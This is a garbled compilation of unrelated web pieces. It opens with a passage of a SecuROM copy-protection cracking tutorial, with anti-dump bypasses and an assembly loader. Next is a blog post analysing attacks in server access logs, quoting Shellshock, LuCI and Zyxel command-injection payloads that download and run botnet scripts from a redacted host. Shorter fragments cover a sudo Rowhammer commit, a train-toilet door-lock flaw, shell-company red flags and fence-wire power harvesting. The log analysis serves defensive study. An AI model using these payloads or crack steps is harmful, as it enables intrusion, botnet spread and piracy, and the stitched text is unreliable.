<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_73.PNG" alt="securom_backup_73"></p>
<p>That’s my user name over there: Weeeeeee. Well at line 0xFA6843 it takes 4 chars from name and adds them to EAX, this is very simple to patch so you can do it on your own. Not much stuff going on. </p>
<p>In simple words, if you run dump as different user, it will crash at some point. </p>
<p>And last and 8th check: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_74.PNG" alt="securom_backup_74"></p>
<p>Very simple anti-dump check, it loads address of advapi32.dll in edx, and address of kernel32.dll to eax, now it plays a little bit with PE header. Of course on different windows version kernel32.dll and advapi32.dll probably will have different values there. It could happen that during MS updates those two, or at least one of them is updated, and in such PE will be screwed, and wrong value will be returned. One simple way to bypass this anti-dump is to run this procedure and get value returned in eax then simly patch this routine with mov eax, that_value/retn 4 </p>
<p>Only 2 more anti-dumps left to go over, only 2 more.</p>
<p>Next anti-dump is related to EntryPoint stored in PE header in memory and is located here: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_75.PNG" alt="securom_backup_75"></p>
<p>adc edi, [400150] is actually adding OptionalHeader.AddressOfEntryPoint to edi. Your dump will have different EntryPoint, but in this real target, SecuROM excepts it to be: 4d5b98h . I have located at least 1 more check, but no need to look for all of them, it is more then enough to add extra code to the dump which will overwrite OptionalHead.AddressOfEntryPoint with this value, and also will update OptionalHeader.SizeOfImage with value which SecuROM wants in its VM interpreter, so we will be injection this code into SecuROM: </p>
<pre><code>loader:                 pusha                         call    __delta __delta:                pop     ebp                         sub     ebp, offset __delta                                                  call    getkernelbase                         xchg    eax, ebx                         gethash &lt;VirtualProtect&gt;                         call    getprocaddress, ebx, hash                                                  push    esp                         mov     ecx, esp                         call    eax, 400000h, 1000h, PAGE_READWRITE, ecx                         add     esp, 4                                                  mov     esi, 400000h                         add     esi, [esi+3ch]                         mov     [esi.pe_addressofentrypoint], 4d5b98h                         mov     [esi.pe_sizeofimage], 87a000h 

                        mov     eax, [ebp+old_entry_point]                         mov     [esp.Pushad_eax], eax                         popa                       jmp     eax 
</code></pre><p>And now, do you remember that TLS stuff I mentioned earlier? Well here it goes: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_76.PNG" alt="securom_backup_76"></p>
<p>It calls TlsGetValue(0x0F), so you will have to patch it with value you got like this: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_77.PNG" alt="securom_backup_77"></p>
<p>And so it has been done, now run your dumped/patched exe, and you will have your game up and running. </p>
<p>That’s all folks… </p>
<h3 id="6-Conclusion-1"><a href="#6-Conclusion-1" title="6. Conclusion"></a>6. Conclusion</h3><p>Well as you may see it is relatively simple to fix SecuROM, still, going for the virgin file would be nice, but it requires more free time as you will have to reverse SecuROM VM to fix it properly. </p>

<p>Follow jump and you will end up here: </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_80.PNG" alt="securom_backup_80"></p>
<p>As one can all this does is that it pushes a value onto stack. Anyway, this is not important to us. The dump works fine without patching this ;) </p>
<h3 id="3-Basic-API-redirection"><a href="#3-Basic-API-redirection" title="3. Basic API redirection"></a>3. Basic API redirection</h3><p>Here is where we first meet a redirection of a call to API: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_81.PNG" alt="securom_backup_81"></p>
<p>Let’s trace into 05693644h </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_82.PNG" alt="securom_backup_82"></p>
<p>As one can see, this is actually a call to GetProcAddress. </p>
<p>If we load our dump into LordPE and take a look at the Directory Table (ImportTable): </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_73.PNG" alt="securom_backup_83"><br>Running through the ImportTable (kernel32.dll) we noticed the following API’s gets redirected: </p>
<p><strong>GetProcAddress  (5670A38)<br>LoadLibraryA   (5670A3C)<br>ExitProcess  (5670AD8)<br>TerminateProcess  (5670AE0)</strong> </p>
<p>We need to fix these API’s. One can do this either by hand or by using ImpRec or ReVirgin. I prefer nothing it automatically coding a unpacker !!! </p>
<h3 id="4-Code-splicing"><a href="#4-Code-splicing" title="4. Code splicing"></a>4. Code splicing</h3><p>The code splicing in SecuRom usually looks like this:   </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_84.PNG" alt="securom_backup_84"></p>
<p>Once we trace into 05EB4000h we will enter the wonderful world of SecuRom redirection. I will spare you the heartbreak for going through all the calculation loops, but what it basically does is redirection you to the code splicing code. Anyway, here is the beginning: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_85.PNG" alt="securom_backup_85"></p>
<p>It will eventually end up here: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_86.PNG" alt="securom_backup_86"><br> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_87.PNG" alt="securom_backup_87"><br>As one might see this is part of the code splicing. However we can fix this by forcing the jump at 095A859h to jump to 05E6EEE9h. Now here is something interesting… Look above at line 05E6EF70h… What is this ?? Let’s trace…  A new chapter begins… </p>
<h3 id="5-Advanced-API-redirections"><a href="#5-Advanced-API-redirections" title="5. Advanced API redirections"></a>5. Advanced API redirections</h3><p> Like with the code splicing the advanced API redirection is trigged by a run through the calculation loops.  Most often around 10 times.  No big deal… After a little tracing we end up here:  </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_88.PNG" alt="securom_backup_88"></p>
<p>This is a call to GetStartupInfoA !! </p>
<p>As one can see it’s not advanced at all. I only chose to call it this because of the calculation/obfuscation loops.  </p>
<p>Often calls to API looks very similar to calls to another SecuRom trick…. The Virtual Machine (VM)… Let’s take a look at this feature… </p>

<div id="readability-page-1" class="page"><section>
                <p>I've been self-hosting for over a decade. It's freeing because I own my data, and do not depend on any platform other than my cloud host, which I can easily switch off. Self-hosting gives much insight into what it takes to run a cloud service. Anyone who's had some practice doing this will likely tell you that the internet is a dangerous place.</p><p>Exposing any IP onto the public internet immediately invites a flood of malicious traffic<sup><a href="#fn1" id="fnref1">[1]</a></sup>. While it's undesirable there's a lot to learn from this traffic so I poked through my access logs to see what sorts of attacks I've been hit with recently.</p>
<blockquote>
<p>Note: I'm not a security expert. I'm just a curious developer who likes to poke around so please take any assertions I make with a grain of salt. I wasn't sure what the value would be in redacting the IP addresses of bad guys but I redacted them anyway erring on the side of caution. Additionally, I've redacted some of the more colorful language used by the attackers which included.</p>
</blockquote>
<h2 id="directory-traversal">Directory Traversal</h2>
<p>The most common attacks by a wide margin are directory traversal attacks in search of credentials. The most common appears to be in search of <code>.env</code> which usually contains application secrets.</p>

<p>Additionally, attackers are looking for other common files that contain credentials. In my sample, they seem to be looking for AWS credentials and configuration files, as well as Git repositories.</p>

<p>Other attacks seem to be looking for common directories that may have been accidentally exposed by the administrator. I have to guess that the names are guesses based on common names. I'd be curious to learn more about what their success rate is. Interestingly, the user agents for these attacks mention <code>Mozlila/5.0</code> which as far as I can tell is a typo of <code>Mozilla/5.0</code>. A search on <a href="https://github.com/search?q=%22User-Agent%22%3A+%22Mozlila%2F5.0%22&amp;type=code&amp;ref=nishtahir.com">GitHub</a> (ignoring results attempting to block the user agent) hints that this is likely a typo that was made in a common tool that has been copied and pasted around<sup><a href="#fn2" id="fnref2">[2]</a></sup>.</p>

<p>The lesson here seems to be to expose the absolute bare minimum to the public internet. If you don't need it, don't expose it. If you must expose tools or directories, add some layer of authentication and if possible restrict access to specific IP addresses because bad actors will be looking for it.</p>
<h2 id="shellshock">Shellshock</h2>
<p>Next, we've got a bunch of attacks that seem to be exploiting the Shellshock<sup><a href="#fn3" id="fnref3">[3]</a></sup> vulnerability.</p>
<pre><code>[24/Jan/2024:12:02:50 +0000] 200 - GET http xxx.xxx.xxx.xxx "/" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"
</code></pre>
<p>This vulnerability exploits Webservers that execute CGI scripts with a vulnerable bash version by allowing an attacker to execute arbitrary commands<sup><a href="#fn4" id="fnref4">[4]</a></sup><sup><a href="#fn5" id="fnref5">[5]</a></sup>. When a CGI program starts, it sets environment variables with the content of the request, of note is <code>HTTP_USER_AGENT</code><sup><a href="#fn6" id="fnref6">[6]</a></sup>. When the characters <code>() { :; };</code> are included, bash interprets that as a function that needs to be executed.</p>
<p>In this specific attack, the bad guy sent this function as the user agent.</p>
<pre><code>() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
</code></pre>
<p>Let's break it down further.</p>
<ol>
<li>
<p><code>() { ignored; };</code>: This part defines a function in Bash. The content inside the curly braces is the function body. The ignored command is a placeholder; it doesn't affect the execution but was likely included to prevent syntax errors.</p>
</li>
<li>
<p><code>echo Content-Type: text/html; echo ;</code>: These commands are part of the function body. They set the Content-Type header of the HTTP response to "text/html" and echo an empty line.</p>
</li>
<li>
<p><code>/bin/cat /etc/passwd</code>: This is the malicious command embedded within the function. It attempts to use the <code>cat</code> command to display the contents of the <code>/etc/passwd</code> file, which contains user account information.</p>
</li>
</ol>
<p>If the attack was successful, the attacker would theoretically gain access to my user credentials as well as have a mechanism to execute arbitrary code on the server.</p>
<p>Like the directory traversal attack, the attacker guesses common directories and paths looking for an endpoint that responds favorably.</p>

</code></pre>
<p>This time we've got an attack that seems to be targeting the LuCI web interface for OpenWRT routers<sup><a href="#fn7" id="fnref7">[7]</a></sup>. The attack attempts to inject a command into the country field of a form that downloads and executes a shell script that is hosted remote server. Let's break it down.</p>
<p>The malicious code is in the URL which has been URL encoded. Decoding the URL makes it easier to read.</p>
<pre><code>/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)
</code></pre>
<p>Breaking it down,</p>
<ol>
<li>
<p><code>/cgi-bin/luci/;stok=/locale</code>: This is the path to a CGI script in the LuCI interface. LuCI is a web-based interface for OpenWRT routers and similar embedded devices.</p>
</li>
<li>
<p><code>?form=country&amp;operation=write&amp;country=</code>: These are parameters passed to the CGI script.</p>
</li>
<li>
<p><code>$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)</code>: This is a bash substitution command intended to be executed and the output is substituted into the URL. The command is trying to cd into the <code>/tmp</code> folder, delete all files, download a shell script from a remote server, and execute it.</p>
</li>
</ol>
<blockquote>
<p>Please do not try what I am about to do yourself. At this point in my investigation, I have no idea what the script contains or what it does. I'm taking a calculated risk and have taken measures to keep myself safe. If you're not sure what you're doing, attempting to do the same could cause you to end up with a compromised machine.</p>
</blockquote>
<p>Downloading the script to investigate further, I discovered that the attacker aimed to download and execute an additional binary.</p>

<p>The binaries appear to be named after the architecture of the target device which makes sense since the attacker may not know what architecture the device is running on. This would give them the most surface area to work with. (Note: I censored names because the attacker renamed the binaries to common slurs)</p>
<p>I proceeded to download a binary incompatible with my environment as an additional precaution and installed Ghidra to investigate further. Looking through the binary only had 3 functions without a lot of string data. However, there was a large segment of data that looked like this.</p>

<p>What stands out this time is M-SEARCH with the ST header. This is a UPnP command looking for devices that support the DIAL protocol<sup><a href="#fn10" id="fnref10">[10]</a></sup> on the network. Based on the accompanying XML payload it looks like the malware is programmed to scan for Huawei devices on the network that are vulnerable to command injection. This appears to have been identified as being part of the Mirai botnet<sup><a href="#fn11" id="fnref11">[11]</a></sup>.</p>
<p>I tried to download the referenced <code>yeye.mips</code> however the file didn't appear to be available when I attempted to fetch it. Perhaps the file is only available at certain times of the day or only responds to certain headers or user agents? Running <code>nmap</code> on the server revealed that there were only 2 open ports</p>

<pre><code>[23/Jan/2024:17:56:29 +0000] 400 - GET http localhost "/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://xxx.xxx.xxx.xxx/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;" [Client xxx.xxx.xxx.xxx] [Length 252] [Gzip -] "-" "-"
</code></pre>
<p>This time we have a shell command in the URL of a GET request. The command contains a bunch of <code>${IFS}</code> shell substitutions which we can clean up to make it easier to read.</p>
<pre><code>/bin/zhttpd/ cd /tmp; rm -rf *mips*; wget http://xxx.xxx.xxx.xxx/huhu.mips; chmod 777 huhu.mips; ./huhu.mips zyxel.selfrep;
</code></pre>
<p>This appears to be exploiting <code>zhttpd</code> which a quick search points out is an exploit available in Zyxel devices<sup><a href="#fn12" id="fnref12">[12]</a></sup>. Like the previous exploit, I decided to download the binary and poke around in Ghidra. Fortunately this time, the binary was not packed and as a result see what strings were contained to get a sense of what it was intended to do.</p>
<p>Looking through the strings a few items stood out.</p>

<p>Another DIAL protocol scan. Looking for vulnerable Huawei devices trying to download <code>huhu.mips</code> presumably as a form of self-replication.</p>
<pre><code>0042763c    POST /goform/set_LimitClient_cfg HTTP/1.1

</code></pre>
<p>Another standout was this command. which appear to be targetting routers according to <a href="https://www.akamai.com/blog/security-research/cve-2023-26801-exploited-spreading-mirai-botnet?ref=nishtahir.com">this</a> post by Akamai<sup><a href="#fn13" id="fnref13">[13]</a></sup></p>
<blockquote>
<p>To exploit this vulnerability, an attacker can send the following HTTP POST request to the "/goform/set_LimitClient_cfg" URL:<br>
...<br>
Ensure that the "Cookie" header is set to "user=admin" since the program has no special checks for authentication or authorization. This means that no prior authentication is required to exploit the vulnerability.</p>
</blockquote>
<p>At this point, we can conclude that this is likely an agent of the Mirai botnet. However, some sources also mention that it could be associated with the Linux Medusa<sup><a href="#fn14" id="fnref14">[14]</a></sup> as well.</p>
<h2 id="conclusion">Conclusion</h2>
<p>This is barely scratching the surface of my logs. There are dozens of other exploits that are being attempted daily I could poke through but this post has already gone long enough.</p>
<p>This experience does highlight the importance of keeping devices, especially IoT devices up to date, and if at all possible keep them off the public internet. If they must be exposed, keep them isolated as much as possible to their own VLAN.</p>

      Try to make sudo less vulnerable to ROWHAMMER attacks.
    </p>

    <div><pre>We now use ROWHAMMER-resistent values for ALLOW, DENY, AUTH_SUCCESS,
AUTH_FAILURE, AUTH_ERROR and AUTH_NONINTERACTIVE.  In addition, we
explicitly test for expected values instead of using a negated test
against an error value.  In the parser match functions this means
explicitly checking for ALLOW or DENY instead of accepting anything
that is not set to UNSPEC.

Sunar, all affiliated with the Vernam Applied Cryptography and
Cybersecurity Lab at Worcester Polytechnic Institute, for the report.

            <description><![CDATA[<p>URL: <a href="https://www.devever.net/~hl/traintoilet">https://www.devever.net/~hl/traintoilet</a>, See on <a href="https://news.ycombinator.com/item?id=39163797">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="nh">
          <main>
            <article><p>The other day I rode on a Class 800 train in the UK. This is the “Intercity
Express” train designed to replace the venerable HST (Intercity 125 with Mark 3
coaches, a train of which I have many memories and which I will dearly miss).</p>
<p>Modern trains in the UK have disabled toilets with power-operated doors. The
older models of these toilets had “open”, ”close” and “lock” buttons on the
inside, where you had to press “close”, wait for the door to close, and then
press ”lock”. There is no separate “unlock” button; pressing the “open” button
on the inside automatically unlocks and opens the door.</p>
<p>Of course, there is a reason for the separation of the closing and locking
functions, but not the opening and unlocking functions: it avoids a Denial of
Service attack where someone can just press “close” and then jump out before
the door closes. If the interior “close” button automatically locked the door,
this would result in the toilet becoming permanently inaccessible.</p>
<p>The problem with this design is that most people don't understand state
machines, and this design confused a lot of people who were unable to lock the
door correctly, or believed they'd locked the door when they hadn't.</p>
<figure>
<img src="https://www.devever.net/~hl/img/toilet_fsm.svg" alt="">
<figcaption>The toilet door controls state machine (on older trains)</figcaption>
</figure>

<p>As a result the newer disabled toilets on trains tend to have a lever you have
to move to lock the door:</p>
<figure>
<img src="https://www.devever.net/~hl/img/toilet_controls" alt="TODO">
<figcaption>Train disabled toilet interior controls (Class 800)</figcaption>
</figure>

<p>This design is an improvement since it is more intuitively comprehensible to
most people. Except of course, this lever isn't a “real” lever directly
connected to a locking mechanism but just some input to a microcontroller. This
raises the question of what happens when the state of the lever doesn't match
up with the state of the door and how the microcontroller deals with that.</p>
<p>Some models of train in the UK solve this robustly by having the lever spring
back to the “unlocked” position if you try to move it to the “locked” position
when the door is open. Presumably this lever-return mechanism is
electromagnetically activated whenever the door is in the wrong state for the
lever to be active.</p>
<p>Hitachi, however, have chosen a different strategy: a tiny metal pin is
projected whenever you should not be able to move the door handle from
“unlocked” to “locked”. This pin itself locks the lock handle in the unlocked
position.</p>
<p>The problem with this is that there is some play in the lever around when
exactly the microcontroller detects the lever as being in the “locked”
position. As such, you can close the door, then hold the lever just beyond the
point at which the locking pin could engage with it, but not to the point where
it reads as “locked”. Then you can open the door, but the locking pin projects
into thin air; thus the lever is free and can be moved to the locked position.
The door close button remains active and you can then close the door. I
confirmed that the door will then immediately lock as soon as the door is
closed. Since I could do this and then jump out before the door closes, this is
effectively a toilet DoS vulnerability on a train.</p>
<p><a href="https://www.youtube.com/watch?v=jaIDiwOQfSY">I've posted a video here where I demonstrate this issue.</a></p>
<p>You can also see the locking pin in the image above. Ordinarily, it should not
be visible projected, but because I have the handle at the precise point where
the logic thinks it's in the unlocked position but far enough away from it that
the locking pin can't make contact, the locking pin has projected into air.</p>
<p>This is the second opportunity I've had to test this issue on the Class 800. On
this particular occasion when I was testing this vulnerability, I seem to have
actually confused the toilet door controller enough that it decided “screw
this” and went into out-of-order mode, which didn't happen the first and
previous time. The toilet was working again when I alighted from the train; I
have no idea if it reset automatically after some period or if someone on the
train reset it.</p>
<p>Amusingly this is not the first DoS vulnerability I've found on a train — but
that will have to wait for another article.</p>

<div id="readability-page-1" class="page"><div data-cy="articleContent" id="article-content"><p>Moody’s Analytics has found 21 million “red flags” associated with shell companies that could be used to enable financial crimes, from ancient directors to dubious addresses.</p><div>



<p>For instance, more than 2,200 companies have directors aged 123 years and above, despite the fact that the oldest known human lived to 122, said Richard Graham, a director at Moody’s Analytics, in&nbsp;<a href="https://www.moodys.com/web/en/us/about/insights/data-stories/kyc-innovation-shell-company-indicator.html" target="_blank" rel="noreferrer noopener">research</a>&nbsp;published Monday. One listed director — at 942 years old — would have been born in the 11th century.</p>



<p>Atypical directorship is just one of seven key behaviors highlighted in the research, including mass registration, dormancy and circular ownership. While new regulations across the world are looking to improve transparency at shell companies, there is still some way to go, with $1.6 trillion laundered annually, according to data from Moody’s Analytics.</p>



<p>“Organizations today face mounting complexity in understanding true ownership structures and detecting risky corporate relationships,” said Ted Datta, head of the financial crime compliance practice for Europe, Africa and Americas at Moody’s Analytics. “By detecting these discrepancies, we can equip investigators and analysts with the tools to better investigate fraud.”</p>



<p>Findings from its report included a China-based textile and clothing manufacturer that reported over $2 billion revenues in 2019, despite having only one employee. There’s also thousands of examples of directors below the age of five, and 22,000 entities with a registered address at Egypt’s pyramids. Meanwhile, one individual held 5,751 roles at 2,883 different entities.</p>



<p>The study looked at some 472 million companies in November. The country with the highest number of shell company risks was&nbsp;<a href="https://www.bloomberg.com/news/articles/2023-03-10/russian-money-laundering-of-war-profit-suspected-in-london-by-uk-law-enforcement" target="_blank" rel="noreferrer noopener">the UK</a>, with almost 5 million flags. Companies registered in the US had the most flags related to financial anomalies, at over 1.25 million. Panama is also a hotspot, with 47% of companies in the jurisdiction raising alarm, though the number of anonymous registrations dropped by half following the Panama Papers&nbsp;<a href="https://www.bloomberg.com/news/articles/2021-07-29/panama-law-firm-clients-targeted-in-u-s-tax-evasion-probe" target="_blank" rel="noreferrer noopener">investigations</a>.</p>



<p>While shell companies might have legitimate purposes, their opaqueness is often use to hide criminal financial activity, Moody’s Analytics said. Other red governance flags included jurisdictional risk, outlier ultimate beneficial ownership and financial anomalies, it said.</p></div><p>Subscribe to the CFO Daily newsletter to keep up with the trends, issues, and executives shaping corporate finance. <a href="https://www.fortune.com/newsletters/cfodaily?&amp;itm_source=fortune&amp;itm_medium=article_tout&amp;itm_campaign=cfo_daily" target="_self" rel="">Sign up</a> for free.</p></div></div>]]></description>

The cable was then put up at a height consistent with that of fencing at about 1.2 m (4 ft), making sure that no contact with the ground occurred anywhere. One end of the copper shield of the coax was connected to the full bridge rectifier, with the opposite AC side connected to a metal stake driven into the ground. From this the capacitor was being charged.</p>
<p>As for the results, they were rather concerning and flashy, with the 1000 VAC-rated multimeter going out of range on the AC side of the bridge rectifier, and the capacitor slowly charging up to 1000 V before the experiment was stopped.</p>
<p>Based on the capacity of the capacitor and the final measured voltage of 907 VDC, roughly 36.2 <a href="https://en.wikipedia.org/wiki/Joule?useskin=vector" target="_blank">Joule</a> would have been collected, giving some idea of the power one could collect from a few kilometers of fencing wire underneath such HV lines, and why you probably want to ground them if energy collecting is not your focus.</p>
<p>As for whether storing the power inductively coupled on fence wire can be legally used is probably something best discussed with your local energy company.</p>
